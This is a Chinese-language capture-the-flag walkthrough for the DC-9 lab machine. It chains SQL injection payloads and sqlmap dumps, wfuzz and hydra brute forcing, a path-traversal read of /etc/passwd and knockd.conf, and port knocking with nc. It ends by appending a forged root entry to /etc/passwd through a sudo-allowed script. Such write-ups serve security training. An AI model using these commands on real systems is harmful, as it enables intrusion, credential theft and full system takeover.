# DC9漏洞复现记录
## 1.信息收集
IP扫描
 
    nmap -sP 192.168.149.0/24
     
对比MAC确定靶机IP为 192.168.149.135
 
    nmap -sC -sV -oA dc-9 192.168.149.135

发现开启了22与80端口、并访问80端口
进行**目录扫描**

    nikto -host IP
    dirb IP

目录扫描未发现可疑目录

Apache默认目录 /var/www/html 等等

查看网页源码未发现可疑点

## 2.SQL注入获得用户
该网站存在一个查询框，可能存在**SQL注入漏洞**

    输入尝试的payload 
    
    ' or 1=1 --+
    
    成功查出所有数据————存在SQL注入漏洞

使用 **sqlmap** 进行SQL注入，kali也自带sqlmap

域名为查询后的域名，即查询访问的文件地址

    查询使用数据库
    
    sqlmap -u "http://192.168.149.135/results.php" --data "search=1" --dbs
    
       查询到三个库
       
       information_schema、Staff、users
     
    查询users库中所有表 
    
    sqlmap -u "http://192.168.149.135/results.php" --data "search=1" -D users --tables 
    
       只查询到一个表
       
       UserBetails
     
    查询表中所有数据
    
    sqlmap -u "http://192.168.149.135/results.php" --data "search=1" -D users -T UserDetails --dump
    
       查询到17个账号密码（可将其做成字典）

对登录界面进行**爆破**

    使用wfuzz进行爆破、亦可使用BP等
    
    wfuzz -z file,用户名字典名 -z file,密码字典名 -d "username=FUZZ&password=FUZZ2" http://192.168.149.135/manage.php
     
    可使用 --hw "Word数" 来对结果进行过滤

结果发现全部不匹配

再次SQL注入获取其他库的数据、通过sqlmap自带的碰撞哈希获得解密后的用户名与密码

若未成功碰撞，可前往somd5.com 等网站进行md5查询

    admin transorbital1
    成功登录入网站后台
## 3.LFI读取密码文件
**LFI 本地文件包含**
    使用wfuzz来猜测参数
    
    wfuzz -b 'COOKIE' -w 字典路径 http://192.168.149.135/manage.php?FUZZ=index.php

如
      
      wfuzz -b 'PHPSESSID=ur6fe2lbb3tcdc08bj4gbqsuns' -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.149.135/manage.php?FUZZ=index.php
     
该字典中未找到参数
可能原因：字典不全、后端未对请求的正确和错误进行区分处理
使用绝对路径访问一定存在的文件
将参数index.php 变为 /etc/passwd
仍未发现、猜测为并不在根目录、使用../../跳到根目录
    
    即 ../../../../etc/passwd
     
发现参数 file
成功使用该参数获得系统用户表

    http://192.168.149.135/manage.php?file=../../../../etc/passwd

## 4.Hydra爆破SSH密码
亦可使用美杜莎、msf等工具

使用Hydra与ssh协议对系统用户名进行爆破

    hydra -L 用户名字典 -P 密码字典 IP 协议(ssh等)
     
无法连接、猜测为使用了Linux的knockd服务隐藏了端口
若启用了该服务/etc/knockd.conf文件就会有内容
使用前面的LFI文件包含漏洞得到该文件内容：
 
    [options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn
     
得到定义的序列 7469,8475,9842
使用nmap按顺序访问这3个端口，ssh的22端口将会被开启#倒序访问为关闭(隐藏)
    nmap -p 7469 192.168.149.135
    nmap -p 8475 192.168.149.135
    nmap -p 9842 192.168.149.135
或使用for循环和netcat来按顺序访问这三个端口
    for x in 7469 8475 9842 ;do nc 192.168.149.135 $x;done
     
成功打开ssh的22端口、再次尝试使用hydra爆破系统用户

获得三个**用户及其密码**

    chandlerb UrAG0D!
    joeyt Passw0rd
    janitor Ilovepeepee

使用ssh登录用户

    ssh chandlerb@192.168.149.135
    随后输入密码即可

成功**登录**系统用户

随后可以做的仍然是那几步

   1.  ls -a ; find / "\*"
   2.  sudo -l
   3.  history
   4.  uname -a msf中查找内核漏洞

在janitor用户的工作目录下的一个目录中发现一个**密码文件**

    BamBam01
    Passw0rd
    smellycats
    P0Lic#10-4
    B4-Tru3-001
    4uGU5T-NiGHts
前三个为前面sql注入中发现过的，是重复的
后三个猜测为其他系统用户的密码、加入字典后再次使用hydra爆破

发现一个**新用户**

    fredf B4-Tru3-001
    并使用ssh登录

## 5.添加etcpasswd用户提权
在fredf用户发现可使用**root权限执行**程序

    (root) NOPASSWD: /opt/devstuff/dist/test/test
     
进入目录 
 
   cd /opt/devstuff/dist/test
 
执行文件

   ./test

得到该文件的内容

    python test.py read append
    读取一个文档，并把其最佳到一个文档中

**寻找**这个test.py文件

    find / -name "test.py" 2>/dev/null
    并把标准错误输入到空文件中

得到两个路径

    /opt/devstuff/test.py
    /usr/lib/python3/dist-packages/setuptools/command/test.py

**查看**第一个test.py

    if len (sys.argv) != 3 :
        print ("Usage: python test.py read append")
        sys.exit (1)

    else :
        f = open(sys.argv[1], "r")
        output = (f.read())

        f = open(sys.argv[2], "a")
        f.write(output)
        f.close()
     
作用为：读取第一个文本文档并将其内容追加到第二个文本文档中

    参数1：read 内容来源
    参数2：append 追加到哪里

root的uid与gid为0，反之若这两个为0那就是root，并拥有root权限

    root:x:0:0:root:/root:/user/bin/zsh
    用户名:密码:用户ID:组ID:备注:工作目录:命令解释程序路径(shell)

如何**生成**一个符合Linux的**密码**

    openssl passwd -1 -salt admin 123456
    -1 使用最简单的md5算法加密密码
    -salt 插入一个盐
     
    添加完后，前往/etc/shadow复制刚生成的符号Linux格式的密码（明文为前面设置的123456）
    $1$admin$LClYcRe.ee8dQwgrFc5nz.

将下列**写入**到一个文件中

    admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash
    
写入文本

    echo 'admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash' >> /tmp/passwd

使用root权限执行

    sudo ./test /tmp/passwd /etc/passwd
    
使用root权限用test脚本将/tmp/passwd文件内容写入到/etc/passwd中

使用新用户登录

    su admin
    输入密码123456

成功提权root用户

&#x20;

&#x20;


